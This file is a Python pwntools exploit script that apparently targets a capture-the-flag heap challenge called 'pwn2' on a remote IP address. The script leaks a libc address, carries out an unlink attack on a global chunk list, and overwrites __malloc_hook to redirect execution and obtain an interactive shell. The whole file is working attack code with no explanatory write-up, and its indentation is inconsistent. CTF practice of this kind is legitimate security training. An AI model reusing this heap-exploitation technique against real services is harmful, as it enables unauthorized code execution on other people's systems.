#!/usr/bin/python

from pwn import *
DEBUG = 0

if DEBUG:
	r = process('./pwn2')
	main_arena_offset = 0x3C2760
	elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	malloc_hook_offset = elf.symbols['__malloc_hook']
else:
	r = remote('101.71.29.5',10001)
	#elf = ELF('')
	malloc_hook_offset = 0x00


def create_node(idx):
	r.sendlineafter("---------------------------",'1')
	#r.sendlineafter("enter the index of the node you want to create:",str(idx))
	#r.recvuntil(":")
	r.sendline(str(idx))

def edit_node(idx,length,content):
	r.sendlineafter("---------------------------",'2')
	r.sendline(str(idx))
	r.sendline(str(length))
	r.sendline(str(length))	

def delete_node(idx):
	r.sendlineafter("---------------------------",'3')
        r.sendline(str(idx))

def show_node(idx):
	r.sendlineafter("---------------------------",'4')
        r.sendline(str(idx))


create_node(0)
create_node(1)

delete_node(0)
show_node(0)

r.recvuntil(":")
main_arena_addr = u64(r.recv(6).ljust(8,'\x00'))-0x58

success("main_arena_addr: " + hex(main_arena_addr))
libc_addr = main_arena_addr - main_arena_offset

success("libc_addr: " + hex(libc_addr))
#---------------------------------------------------

create_node(0)

create_node(2)
create_node(3)
create_node(4)

payload = 'a' * 0x80 + p64(0) + p64(0x21)

#edit_node(2,len(payload),payload)
#edit_node(2,5,'aaaaa')
#gdb.attach(r)

#r.sendlineafter("---------------------------",'2\n')
#r.recvuntil("---------------------------")
#r.sendline("2")

r.recv()

# unlink
chunk_list = 0x6012b0
payload = p64(0) +p64(0x81)
payload += p64(chunk_list-24)
payload += p64(chunk_list-16)
payload += 'a' * 0x60
payload += p64(0x80) + p64(0x90)

r.sendline('2\n')
r.sendline('2\n')
r.sendline(str(len(payload)))
r.sendline(payload)

#gdb.attach(r)

delete_node(3)

r.recv()

malloc_hook = libc_addr + malloc_hook_offset
payload2 = p64(0x1111) + p64(malloc_hook)

r.sendline('2\n')
r.sendline('2\n')
r.sendline(str(len(payload2)))
r.sendline(payload2)
#gdb.attach(r)

r.recv()
payload3 = p64(0x00000000004009B6)
r.sendline('2\n')
r.sendline('0\n')
r.sendline(str(len(payload3)))
r.sendline(payload3)

create_node(4)

r.interactive()